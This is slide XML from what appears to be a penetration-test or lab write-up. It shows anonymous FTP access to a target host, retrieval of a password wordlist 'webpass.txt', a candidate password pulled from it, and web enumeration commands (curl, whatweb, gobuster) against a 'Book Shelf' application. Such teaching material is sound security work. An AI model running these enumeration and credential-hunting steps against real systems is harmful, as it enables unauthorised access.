              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>anonymous</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6803136" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6803136" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ls -la</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF4444"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1417320"/>
            <a:ext cx="1481328"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webpass.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9930384" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9930384" y="1417320"/>
            <a:ext cx="1481328" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>get webpass.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="493776" y="2139696"/>
            <a:ext cx="5504688" cy="2624328"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2787"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="21" name="Image 0" descr="/home/claude/report_imgs/fig2_ftp_webpass.jpg">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2194560"/>
            <a:ext cx="5394960" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4782312"/>
            <a:ext cx="5394960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Figure 1 — Anonymous FTP login and webpass.txt retrieval</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2148840"/>
            <a:ext cx="5440680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHAT ANONYMOUS FTP MEANS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2350008"/>
            <a:ext cx="5440680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The server accepts the username “anonymous” with any password, granting file access to literally anyone on the network — no credentials of any kind required.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3017520"/>
            <a:ext cx="5440680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHY IT MATTERS HERE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3218688"/>
            <a:ext cx="5440680" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>It let us browse and download files with zero authentication — including webpass.txt, a file that turned out to be a password wordlist.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3840480"/>
            <a:ext cx="5440680" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6336792" y="3931920"/>
            <a:ext cx="5111496" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ grep -niE 'book|shelf|securium|meaco|behealthy|keep' webpass.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4526280"/>
            <a:ext cx="5440680" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11429"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="4526280"/>
            <a:ext cx="1188720" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7452360" y="4526280"/>
            <a:ext cx="4023360" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KeepR3ading@B00ks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5120640"/>
            <a:ext cx="5394960" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7619"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5230368"/>
            <a:ext cx="4937760" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IMPORTANT DISTINCTION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5468112"/>
            <a:ext cx="4937760" cy="548640"/>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This is a CLUE, not yet a confirmed credential — it is one entry in a large wordlist. It only becomes meaningful once tested against something real.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9</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03 · ENUMERATION</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Web Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1280160"/>
            <a:ext cx="11064240" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why shift from FTP to HTTP? Port 80 hosts a custom application — “Book Shelf” — which represents the largest, least-understood attack surface on the target.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1874520"/>
            <a:ext cx="5394960" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1965960"/>
            <a:ext cx="5065776" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -i http://192.168.76.157/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2514600"/>
            <a:ext cx="5394960" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2606040"/>
            <a:ext cx="5065776" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ whatweb http://192.168.76.157/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3154680"/>
            <a:ext cx="5394960" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5085"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3246120"/>
            <a:ext cx="5065776" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ gobuster dir -u http://192.168.76.157/root/ \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$   -w /usr/share/wordlists/dirb/big.txt \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$   -x php,txt,html,bak,old,zip,conf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
